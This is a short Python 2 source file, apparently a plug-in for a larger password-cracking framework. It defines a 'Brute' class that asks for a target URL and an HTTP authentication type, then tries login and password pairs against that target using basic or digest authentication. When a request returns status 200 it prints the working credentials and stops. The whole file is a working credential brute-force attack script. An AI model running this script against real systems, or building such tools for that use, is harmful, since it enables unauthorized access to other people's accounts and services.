# coding: utf8

from core.output import ERR, YES, NO

try:
    from requests.auth import HTTPBasicAuth, HTTPDigestAuth
    import requests
except ImportError:
    print '{0}No such module: requests.'.format(ERR)

class Brute (object):
    def __init__ (self):
        self.addr = raw_input ('Enter Address: ').strip ('\n')
        self.auth = raw_input ('Enter HTTP Auth type (digest, basic): ').strip ('\n')

    def run (self, **kwargs):

        authtype = HTTPBasicAuth (kwargs ['current_login'], kwargs ['current_password'])
        if self.auth == 'digest':
            authtype = HTTPDigestAuth (kwargs ['current_login'], kwargs ['current_password'])

        if requests.get (self.addr, auth=authtype).status_code == 200:
            print '{0}Login: {1} | Password: {2}'.format (YES, kwargs ['current_login'], kwargs ['current_password'])
            exit ()
        else:
            print '{0}Password: {2} is not for {1}'.format(NO, kwargs['current_login'], kwargs['current_password'])